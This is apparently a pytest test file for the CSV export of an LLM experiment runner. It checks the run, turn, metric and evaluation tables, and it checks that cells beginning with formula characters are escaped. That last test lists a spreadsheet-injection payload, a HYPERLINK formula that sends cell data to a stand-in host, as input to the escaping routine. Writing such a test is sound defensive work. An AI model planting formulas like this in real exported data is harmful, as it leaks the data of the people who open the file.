# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright 2026 Kumar Muthuraman
"""Experiments, step 6 (D12, D138 (12), SPEC §5.5): the five CSV tables."""

import csv
import io
import json

import pytest

from teamrunner.cli import main
from teamrunner.console import Console
from teamrunner.model import Reply

from test_experiment_run import OPENAI, records  # noqa: F401
from test_experiment_run import home  # noqa: F401  the key file and prices
from test_metrics import Grader, exp, go  # noqa: F401  an experiment with an evaluator

HARD = 'Line 10 is wrong, "clearly";\nand line 12, too — ünïcode'


class Wordy(Grader):
    """Says something a CSV must quote: commas, quotes, a line break, non-ASCII."""

    async def complete(self, model, params, messages, schema, tools=None):
        reply = await super().complete(model, params, messages, schema, tools)
        if schema and "said" in reply.text:
            data = json.loads(reply.text)
            data["said"] = HARD
            reply = Reply(json.dumps(data), reply.model_resolved, reply.usage, reply.cost_usd, 1)
        return reply


def table(folder, name):
    with (folder / f"{name}.csv").open(encoding="utf-8", newline="") as stream:
        return list(csv.DictReader(stream))


def test_the_five_tables(exp, tmp_path):
    go(exp, Wordy())
    out = tmp_path / "out"
    stream = io.StringIO()
    from teamrunner.experiment_run import export_experiment
    assert export_experiment(exp, out, Console(False, stream)) == 0
    text = stream.getvalue()
    assert "exported 6 runs (every run, with `counts` saying which count)" in text

    runs = table(out, "runs")
    assert len(runs) == 6 and {r["condition"] for r in runs} == {"flat", "led"}
    assert all(r["counts"] == "true" and r["status"] == "completed" for r in runs)
    assert all(r["seed"] and r["study_hash"].startswith("sha256:") and r["cost_charged_usd"] == "" for r in runs)
    ids = {r["run_id"] for r in runs}

    turns = table(out, "turns")
    assert len(turns) == 6 * 5 and {t["run_id"] for t in turns} == ids
    assert turns[0]["turn"] == "1" and turns[0]["model_asked"] == "openai/gpt-5" and turns[0]["reused"] == "false"
    assert turns[0]["version_hash"] and HARD in {t["content"] for t in turns}  # read back exactly

    outputs = table(out, "outputs")
    assert {(o["member"], o["field"]) for o in outputs} == {("alice", "verdict")}

    metrics = table(out, "metrics")
    assert {(m["metric"], m["report"]) for m in metrics} == {("quality", "score"), ("quality", "sound"),
                                                              ("quality", "verdict")}
    score = next(m for m in metrics if m["report"] == "score")
    assert score["value"] == "7.0" and score["n_evaluations"] == "1" and score["evaluator_hash"].startswith("sha256:")
    assert next(m for m in metrics if m["report"] == "sound")["value"] == "true"

    evaluations = table(out, "evaluations")
    assert len(evaluations) == 6 * 4 and {e["field"] for e in evaluations} == {"score", "sound", "verdict", "reason"}


def test_completed_keeps_only_the_runs_that_count(exp, tmp_path):
    text = (exp / "experiment.md").read_text().replace("max_cost_usd: 10", "max_cost_usd: 0.1")
    (exp / "experiment.md").write_text(text, encoding="utf-8")
    go(exp, Grader(cost=0.03), evaluating="none")  # ≈ $0.07 estimated, $0.15 a run: the ceiling cuts in
    stopped = [r for _, r in records(exp) if r["status"] == "stopped"]
    assert stopped
    assert main(["experiment", str(exp), "--export", str(tmp_path / "all")]) == 0
    assert main(["experiment", str(exp), "--export", str(tmp_path / "done"), "--completed"]) == 0
    every, done = table(tmp_path / "all", "runs"), table(tmp_path / "done", "runs")
    assert len(every) == len(records(exp)) and len(done) == len(every) - len(stopped)
    assert {r["stopped_by"] for r in every if r["status"] == "stopped"} == {"ceiling"}
    assert all(r["counts"] == "true" for r in done)
    assert {t["run_id"] for t in table(tmp_path / "done", "turns")} <= {r["run_id"] for r in done}


def test_completed_only_with_export(exp, capsys):
    assert main(["experiment", str(exp), "--completed"]) == 1
    assert "--completed goes with --export" in capsys.readouterr().err


def test_rehearsals_are_never_exported(exp, tmp_path):
    from teamrunner.experiment_run import run_experiment
    run_experiment(exp, Console(False, io.StringIO()), rehearse=True)
    assert main(["experiment", str(exp), "--export", str(tmp_path / "out")]) == 0
    assert table(tmp_path / "out", "runs") == []


def test_a_factor_may_have_a_built_in_column_s_name(tmp_path):
    """Found in the 2026-11-16 review (E2): a factor called `round` made --export crash after the
    runs were paid for. Each factor's column is now `factor_<name>`."""
    from test_experiment_run import TEAM, Paid, go as run, write
    from teamrunner.experiment_run import export_experiment
    write(tmp_path / "review", TEAM)
    front = ("name: exp\nbase: ../review\nfactors:\n  round:\n"
             "    - label: early\n      change: {}\n"
             "    - label: late\n      change: {alice.prompt: file:variants/alice.md}\n"
             "  status:\n    - label: plain\n      change: {}\n"
             "replications: 2\nseed: 7\nlimits: {max_concurrent: 2, max_cost_usd: 10}\n")
    exp = write(tmp_path / "exp", {"experiment.md": f"---\n{front}---\n",
                                   "variants/alice.md": "alice leads the review of {{code}}.\n"})
    assert run(exp, model=Paid())[0] == 0
    out = tmp_path / "out"
    assert export_experiment(exp, out, Console(False, io.StringIO())) == 0
    runs = table(out, "runs")
    assert len(runs) == 4
    assert list(runs[0])[:5] == ["run_id", "condition", "factor_round", "factor_status", "replicate"]
    assert {(r["condition"], r["factor_round"], r["factor_status"]) for r in runs} == \
        {("early+plain", "early", "plain"), ("late+plain", "late", "plain")}
    assert {r["round"] for r in runs} == {"1", "2"} and all(r["status"] == "completed" for r in runs)


def test_a_cell_excel_would_run_as_a_formula_is_written_as_text():
    """Found in the 2026-11-16 review (S10): model text such as `=HYPERLINK(…)` reached the
    CSV as it was, and Excel runs a cell starting with = + - @ as a formula (D158)."""
    from teamrunner.export import _cell
    for text in ['=HYPERLINK("https://bad.example/?"&A2,"details")', "+1", "- first point", "@SUM(A1)",
                 "\tx", "\rx"]:
        assert _cell(text) == "'" + text
    assert _cell("plain words") == "plain words" and _cell("a = b") == "a = b"
    assert _cell(-3) == -3 and _cell(-0.5) == "-0.5"  # numbers are numbers, not text
    assert _cell(["=x"]) == '["=x"]'
